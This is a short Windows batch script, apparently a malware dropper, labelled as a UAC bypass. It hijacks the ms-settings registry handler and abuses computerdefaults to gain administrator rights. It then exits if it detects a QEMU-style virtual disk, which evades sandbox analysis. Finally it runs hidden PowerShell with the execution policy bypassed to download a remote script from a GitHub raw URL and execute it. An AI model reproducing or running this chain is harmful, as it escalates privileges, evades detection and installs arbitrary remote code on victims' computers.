@echo off
echo uac bypass by hai1723
cls
net session >nul 2>&1
if not %errorlevel% == 0 ( goto :uac)
goto :start
:uac
reg add hkcu\Software\Classes\ms-settings\shell\open\command /d "%~f0" /f
reg add hkcu\Software\Classes\ms-settings\shell\open\command /v "DelegateExecute" /f
computerdefaults --nouacbypass
reg delete hkcu\Software\Classes\ms-settings /f
exit
:start
powershell "$d = wmic diskdrive get model;if ($d -like '*DADY HARDDISK*' -or $d -like '*QEMU HARDDISK*') { taskkill /f /im cmd.exe }"
powershell -w hidden -nop -ep bypass -c "iwr -useb https://raw.githubusercontent.com/43a1723/test/main/download.ps1 | iex"
